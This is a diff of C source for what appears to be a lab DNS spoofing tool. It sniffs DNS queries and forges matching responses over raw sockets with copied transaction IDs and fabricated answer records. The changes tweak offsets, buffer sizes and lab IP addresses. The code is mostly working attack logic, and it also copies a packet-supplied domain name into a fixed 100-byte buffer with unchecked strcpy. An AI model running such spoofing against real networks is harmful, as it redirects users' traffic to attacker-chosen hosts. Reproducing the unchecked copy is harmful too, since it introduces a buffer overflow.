@@ -19,6 +19,8 @@
 
 /* ethernet headers are always exactly 14 bytes [1] */
 #define SIZE_ETHERNET 14
+#define SIZE_DNS_ANSWER_DATA_1 16
+#define SIZE_DNS_HEADER 12
 
 #define ARP_REQUEST 1   /* ARP Request             */ 
 #define ARP_REPLY 2     /* ARP Reply               */ 
@@ -71,7 +73,7 @@ struct dns_answer_data_1{
 } __attribute__((packed, aligned(1)));
 
 struct dns_answer {
-	u_char name[1000];
+	u_char name[100];
 	u_char separator;
 };
 
@@ -218,12 +220,12 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 		perror("socket() error\n");
 		return;
 	}
-	char *temp = "172.16.241.140";
+	char *temp = "172.16.241.143";
 	struct in_addr addr;
 	source.sin_family = AF_INET;
 	source.sin_port = destination_port;
-	inet_aton(temp, &addr);
-	source.sin_addr = addr;
+	//inet_aton(temp, &addr);
+	source.sin_addr.s_addr = destination_address;
 	
 	// Inform the kernel do not fill up the headers' structure, we fabricated our own
 	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
@@ -290,9 +292,9 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, 
 			if(ntohs(udp->uh_dport) == 53)
 			{
 				// Forging the DNS Header
-				struct dns_header* spoofed_dns_header = (struct dns_header*)(datagram + size_ip + sizeof(struct udphdr));
+				struct dns_header* spoofed_dns_header = (struct dns_header*)(datagram + size_ip + 8);
 				const struct dns_header *dns;
-				dns = (struct dns_header*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr));
+				dns = (struct dns_header*)(packet + SIZE_ETHERNET + size_ip + 8);
 				spoofed_dns_header->id = dns->id;
 				spoofed_dns_header->flags = htons(33152); // Setting flags as 8180 (33152 is 81 80 in hexadecimal)
 				spoofed_dns_header->qdcount = dns->qdcount;
@@ -305,14 +307,14 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, 
 				// Copying the domain name
 				char name1[100];
 				//memset(name1, '\0', sizeof(name1));
-				char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header));
+				char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER);
 
-				struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header));
+				struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + 8 + SIZE_DNS_HEADER);
 				//spoofed_dns_answer->name = (u_char*)malloc(strlen(domain)*sizeof(char));
 				strcpy((char*)spoofed_dns_answer->name, (const char*)domain);
 
 				const struct dns_query *query;
-				query = (struct dns_query*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
+				query = (struct dns_query*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER \
 										 + strlen(domain) + 1);
 
 
@@ -320,14 +322,14 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, 
 				spoofed_dns_answer->separator = 0;
 				// Populating Answer Data
 				struct dns_answer_data* answer_data;
-				answer_data = (struct dns_answer_data*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
+				answer_data = (struct dns_answer_data*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
 						    + strlen(domain) + 1);
 				answer_data->type = query->type;
 				answer_data->class = query->class;
 
 				
 				struct dns_answer_data_1* answer_data1;
-				answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
+				answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
 						    + strlen(domain) + 1 + sizeof(struct dns_answer_data));
 				answer_data1->name = htons(49164);  // c0 0c
 				answer_data1->type = query->type;
